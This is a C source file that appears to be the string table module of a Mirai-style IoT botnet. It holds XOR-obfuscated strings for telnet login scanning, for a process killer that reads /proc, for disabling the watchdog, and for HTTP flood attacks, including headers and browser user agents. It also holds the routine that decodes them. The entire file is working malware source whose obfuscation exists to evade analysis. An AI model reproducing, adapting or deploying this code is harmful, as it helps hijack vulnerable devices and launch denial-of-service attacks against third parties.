#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xbaadf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_SCAN_CB_PORT, "\x0B\xC8", 2); // 57634
    add_entry(TABLE_EXEC_SUCCESS, "\xBD\x82\x85\xCA\x86\x85\x9C\x8F\x99\xCA\x9E\x82\x8F\xCA\x99\x9F\x84\xEA", 18); // Who loves the sun
    add_entry(TABLE_INSTANCE_EXISTS, "\xA1\x83\x86\x86\x83\x84\x8D\xCA\x9A\x98\x8F\x9C\x83\x85\x9F\x99\xCA\x83\x84\x99\x9E\x8B\x84\x89\x8F\xEA", 26); // Killing previous instance
    
    add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7);
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5);
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4);
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6);
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14);
	
    add_entry(TABLE_ATK_RESOLVER, "\xC5\x8F\x9E\x89\xC5\x98\x8F\x99\x85\x86\x9C\xC4\x89\x85\x84\x8C\xEA", 17);
    add_entry(TABLE_ATK_NSERV, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", 11);
	
    add_entry(TABLE_MISC_WATCHDOG, "\xC5\x8E\x8F\x9C\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 14);
    add_entry(TABLE_MISC_WATCHDOG2, "\xC5\x8E\x8F\x9C\xC5\x87\x83\x99\x89\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 19);
    add_entry(TABLE_MISC_WATCHDOG3, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 23);
    add_entry(TABLE_MISC_WATCHDOG4, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB6\xCA\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 24);
    add_entry(TABLE_MISC_RANDOM, "\x8B\x88\x89\x8E\x8F\x8C\x8D\x82\x83\x80\x81\x86\x87\x84\x85\x9A\x9B\x98\x99\x9E\x9F\x9C\x9D\x92\x93\x90\xDB\xD8\xD9\xDE\xDF\xDC\xDD\xD2\xD3\xDA\xEA", 37);

    add_entry(TABLE_SCAN_SHELL, "\x99\x82\x8F\x86\x86\xEA", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x8F\x84\x8B\x88\x86\x8F\xEA", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x99\x93\x99\x9E\x8F\x87\xEA", 7);
    add_entry(TABLE_SCAN_SH, "\x99\x82\xEA", 3);
    add_entry(TABLE_SCAN_QUERY, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\xA3\xB0\xDB\xA2\xD3\xEA", 19);
    add_entry(TABLE_SCAN_RESP, "\xA3\xB0\xDB\xA2\xD3\xD0\xCA\x8B\x9A\x9A\x86\x8F\x9E\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x84\x89\x85\x98\x98\x8F\x89\x9E\xEA", 9);
    add_entry(TABLE_SCAN_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8);
    add_entry(TABLE_SCAN_OGIN, "\x85\x8D\x83\x84\xEA", 5);
    add_entry(TABLE_SCAN_ENTER, "\x8F\x84\x9E\x8F\x98\xEA", 6);
	
    add_entry(TABLE_ATK_KEEP_ALIVE, "\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xCA\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 23);
    add_entry(TABLE_ATK_ACCEPT, "\xAB\x89\x89\x8F\x9A\x9E\xD0\xCA\x9E\x8F\x92\x9E\xC5\x82\x9E\x87\x86\xC6\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\x82\x9E\x87\x86\xC1\x92\x87\x86\xC6\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\x87\x86\xD1\x9B\xD7\xDA\xC4\xD3\xC6\x83\x87\x8B\x8D\x8F\xC5\x9D\x8F\x88\x9A\xC6\xC0\xC5\xC0\xD1\x9B\xD7\xDA\xC4\xD2\xEA", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\xAB\x89\x89\x8F\x9A\x9E\xC7\xA6\x8B\x84\x8D\x9F\x8B\x8D\x8F\xD0\xCA\x8F\x84\xC7\xBF\xB9\xC6\x8F\x84\xD1\x9B\xD7\xDA\xC4\xD2\xEA", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\xA9\x85\x84\x9E\x8F\x84\x9E\xC7\xBE\x93\x9A\x8F\xD0\xCA\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\xC7\x9D\x9D\x9D\xC7\x8C\x85\x98\x87\xC7\x9F\x98\x86\x8F\x84\x89\x85\x8E\x8F\x8E\xEA", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x99\x8F\x9E\xA9\x85\x85\x81\x83\x8F\xC2\xCD\xEA", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x98\x8F\x8C\x98\x8F\x99\x82\xD0\xEA", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x86\x85\x89\x8B\x9E\x83\x85\x84\xD0\xEA", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x99\x8F\x9E\xC7\x89\x85\x85\x81\x83\x8F\xD0\xEA", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x89\x85\x84\x9E\x8F\x84\x9E\xC7\x86\x8F\x84\x8D\x9E\x82\xD0\xEA", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x9E\x98\x8B\x84\x99\x8C\x8F\x98\xC7\x8F\x84\x89\x85\x8E\x83\x84\x8D\xD0\xEA", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x89\x82\x9F\x84\x81\x8F\x8E\xEA", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x89\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xEA", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x99\x8F\x98\x9C\x8F\x98\xD0\xCA\x8E\x85\x99\x8B\x98\x98\x8F\x99\x9E\xEA", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x99\x8F\x98\x9C\x8F\x98\xD0\xCA\x89\x86\x85\x9F\x8E\x8C\x86\x8B\x98\x8F\xC7\x84\x8D\x83\x84\x92\xEA", 25);

    add_entry(TABLE_HTTP_ONE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xA7\x8B\x89\x83\x84\x9E\x85\x99\x82\xD1\xCA\xA3\x84\x9E\x8F\x86\xCA\xA7\x8B\x89\xCA\xA5\xB9\xCA\xB2\xCA\xDB\xDA\xB5\xDB\xDB\xB5\xDC\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDC\xDA\xDB\xC4\xDD\xC4\xDD\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xBC\x8F\x98\x99\x83\x85\x84\xC5\xD3\xC4\xDB\xC4\xD8\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDC\xDA\xDB\xC4\xDD\xC4\xDD\xEA", 117);
    add_entry(TABLE_HTTP_TWO, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xDB\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDE\xD2\xC4\xDA\xC4\xD8\xDF\xDC\xDE\xC4\xDB\xDA\xD3\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 110);
    add_entry(TABLE_HTTP_THREE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDB\xDA\xC4\xDA\xD1\xCA\xBD\x83\x84\xDC\xDE\xD1\xCA\x92\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDC\xD8\xC4\xDA\xC4\xD9\xD8\xDA\xD8\xC4\xD2\xD3\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 115);
    add_entry(TABLE_HTTP_FOUR, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xD9\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xD1\xCA\x98\x9C\xD0\xDF\xDA\xC4\xDA\xC3\xCA\xAD\x8F\x89\x81\x85\xC5\xD8\xDA\xDB\xDA\xDA\xDB\xDA\xDB\xCA\xAC\x83\x98\x8F\x8C\x85\x92\xC5\xDF\xDA\xC4\xDA\xEA", 73);
    add_entry(TABLE_HTTP_FIVE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xD9\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDF\xDB\xC4\xDA\xC4\xD8\xDD\xDA\xDE\xC4\xDB\xDA\xDC\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 110);

	add_entry(TABLE_ATK_HTTP, "\xA2\xBE\xBE\xBA\xC5\xDB\xC4\xDB\xEA", 9);
    add_entry(TABLE_ATK_USERAGENT, "\xBF\x99\x8F\x98\xC7\xAB\x8D\x8F\x84\x9E\xD0\xEA", 12);
    add_entry(TABLE_ATK_HOST, "\xA2\x85\x99\x9E\xD0\xEA", 6);
    add_entry(TABLE_ATK_COOKIE, "\xA9\x85\x85\x81\x83\x8F\xD0\xEA", 8);
    add_entry(TABLE_ATK_SEARCHHTTP, "\x82\x9E\x9E\x9A\xEA", 5);
    add_entry(TABLE_ATK_URL, "\x9F\x98\x86\xD7\xEA", 5);
    add_entry(TABLE_ATK_POST, "\xBA\xA5\xB9\xBE\xEA", 5);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

